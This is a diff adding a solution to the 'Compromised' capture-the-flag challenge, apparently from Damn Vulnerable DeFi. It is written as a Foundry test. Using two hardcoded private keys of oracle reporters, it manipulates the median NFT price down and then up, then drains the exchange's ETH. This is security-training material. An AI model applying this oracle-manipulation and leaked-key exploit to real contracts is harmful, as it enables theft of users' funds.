@@ -22,8 +22,8 @@ contract CompromisedChallenge is Test {
 
 
     address[] sources = [
-        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
-        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
+        0x188Ea627E3531Db590e6f1D71ED83628d1933088, // compromised reporter 1
+        0xA417D473c40a4d42BAd35f147c21eEa7973539D8, // compromised reporter 2
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
@@ -75,7 +75,49 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
         
+        vm.startBroadcast(privateKey1);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopBroadcast();
+
+        vm.startBroadcast(privateKey2);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopBroadcast();
+
+        uint256 medianPrice = oracle.getMedianPrice("DVNFT");
+        console.log("medianPrice", medianPrice);
+
+        vm.startPrank(player);
+        uint256 id;
+        id = exchange.buyOne{value: 1}();
+        vm.stopPrank();
+
+        console.log("nft.balanceOf(player)", nft.balanceOf(player));
+
+        vm.startBroadcast(privateKey1);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopBroadcast();
+
+        vm.startBroadcast(privateKey2);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopBroadcast();
+
+        medianPrice = oracle.getMedianPrice("DVNFT");
+        console.log("medianPrice", medianPrice);
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        (bool success, ) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        assertEq(success, true, "Transfer failed");
+
+         console.log("nft.balanceOf(player)", nft.balanceOf(player));
+        vm.stopPrank();
+
+       
+
     }
 
     /**
